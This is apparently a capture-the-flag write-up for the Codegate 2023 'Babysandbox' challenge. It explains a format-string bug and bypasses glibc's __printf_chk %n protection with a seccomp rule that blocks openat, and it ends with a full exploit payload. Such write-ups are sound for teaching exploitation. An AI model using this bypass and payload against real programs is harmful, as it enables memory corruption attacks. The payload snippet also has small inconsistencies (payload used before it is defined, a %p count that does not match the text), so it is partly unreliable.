---
title: Babysandbox
date: 2023-07-09T01:52:07+03:00
description: Writeup for Babysandbox [Codegate Qualifs 2023]
author: zenbassi
tags:
- pwn
- misc
draft: true
---
___

## Challenge Description

Can't remember. ups

## Intuition

For this challenge we have the source code available, so looking at it we notice a few things.

Firstly, we notice that the first input is the length and the payload for a seccomp rule. Then we see that a first check is passed and `vuln` is called. We can provide a second input of maximum 256 bytes, which is used in a printf-like function. This looks like a classic string-format vulnerability.

```c
void vuln() {
    char input[0x100];
    memset(input, 0, sizeof(input));

    __printf_chk(1, "Let's check our mitigation ^_^\n");
    __printf_chk(1, "Protect : %p\n", &target);
    int res = read(0, input, sizeof(input) - 1);
    if (res < 0) {
        __printf_chk(1, "Functionality is broken T_T\n");
        return;
    }
    // We have a dangerous vulnerability here!
    __printf_chk(1, input); // <- string format vulnerability

    if (target == 0x1337) {
        __printf_chk(1, "Mitigation failed.. The flag has been exposed T_T\n");
        read_flag();
    }
    else {
        __printf_chk(1, "\nNow we are safe from memory corruption! Thank you ^_^\n");
    }
    return;
}
```

The issue is that `__printf_chk` is a hardened version of `printf` which
doesn't allow the use of `%n` to write to memory. We have to somehow bypass
this limitation in order to change the value in `target` to `0x1337`.


## Solution

The easiest way we found to generate seccomp payloads is to use `seccomp-tools`
[^1]. If we compile `return ALLOW` we get `\x06\x00\x00\x00\x00\x00\xFF\x7F`.
To make this a valid payload we prepend the 4-byte length and get
`\x08\x00\x00\x00\x06\x00\x00\x00\x00\x00\xff\x7f`. Sending this to the program 
passes the seccomp-loading phase, so we're good in that regard.

Now what? 

### The seccomp payload

We somehow have to bypass the check in `__printf_chk` and might be able to use
some seccomp rules to achieve this. Luckily, we found
[this](https://bruce30262.github.io/hxp-CTF-2017-hardened-flag-store/) [^2]
blog post, which pretty much does exactly what we need. Looking in the `glib`
implementation of `__printf_chk`, we see that the issue described in the blog
still exists. To find this, I just searched on
[codebrowser](https://codebrowser.dev/glibc/glibc/) for the error `*** %n in
writab...`.

```c
if ((mode_flags & PRINTF_FORTIFY) != 0)
{
    if (!readonly_format)
    {
        extern int __readonly_area (const void *, size_t)
    attribute_hidden;
        readonly_format
    = __readonly_area (format, ((STR_LEN (format) + 1)
                    * sizeof (CHAR_T)));
    }
    if (readonly_format < 0)
    __libc_fatal ("*** %n in writable segment detected ***\n");
}
```

It's clear that `__readonly_area` gets called and returns something lower than
0. The plan would be to return something greater than 0 to bypass the security
check. Looking at the `__readonly_area` implementation we see the following:

```c
  FILE *fp = fopen ("/proc/self/maps", "rce");
  if (fp == NULL)
    {
      /* It is the system administrator's choice to not have /proc
	 available to this process (e.g., because it runs in a chroot
	 environment.  Don't fail in this case.  */
      if (errno == ENOENT
	  /* The kernel has a bug in that a process is denied access
	     to the /proc filesystem if it is set[ug]id.  There has
	     been no willingness to change this in the kernel so
	     far.  */
	  || errno == EACCES)
	return 1;
      return -1;
    }
```

It's clear now that if we make `fopen` fail with `ENOENT` or `EACCESS` the
function will return 1, which will bypass the check we're concerned with.
This is achievable via seccomp rules:

```
A = sys_number
A != openat ? ok : next
A = args[1]
A &= 0xff
A == 0x47 ? ok : next
return ERRNO(13) # ERRNO(EACCES)
ok:
return ALLOW
```
Notice a few things:
1. We're looking for the `openat` syscall. We wasted a lot of time trying to
   catch an `open` syscal, but eventually thought of running our binary with
   `strace`. Only then we saw the it calls `openat`.
2. We also check the first argument of the `openat` call, which is the file
   name address. `0x47` is the last byte of the `FLAG_PATH` address.

### The string format exploit

We have to write `0x1337` to the address. The way we can to this is by using
the `%n` format modifier, which writes **the number of bytes written so** to the address given. However, we have to use some tricks in order to abuse this.

1. The first trick is to use `%{k}c` which prints a character given as argument
   but also pads it to the left with spaces until the number of outputted
   characters is equal to $k$.
2. In order to use `%n` with a given address, we first have to _consume_
   some arguments. We can do that using `%p`. Now the question is, how many
   arguments? 6 at least are taken from registers, which we have no control
   over. The following are taken from the stack, 8 bytes at a time (if we use
   `%p`), so we have to carefully align everything.

Our final payload looked like this:
```
x = 4771
seccomp_payload = b" \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x04\x01\x01\x00\x00 \x00\x00\x00\x18\x00\x00\x00T\x00\x00\x00\xFF\x00\x00\x00\x15\x00\x01\x00G\x00\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"
payload = p32(len(payload)) + seccomp_payload

payload += f'%{x}c%p.%p.%p.%p.%p.%p.%p.%p.%p.%p%naaa'.encode()
payload += p64(0x404088) # target address
```

The length of the given format string (excluding the target address) is exactly 40 bytes, meaning that we have to use 5 `%p`s to consume it all. In the end we append the target address to the payload so `%n` writes to it. `x` has to be adjusted according to how much characters are printed overall (can be easily done with gdb).

### Flag

`bestctf{.hidden_struggled_with_this_one}`

## References (in case you used [^footnotes] thingies)
[^1]: seccomp-tools: https://github.com/david942j/seccomp-tools
[^2]: 2017 HXP CTF - hardened flag writeup: https://bruce30262.github.io/hxp-CTF-2017-hardened-flag-store/
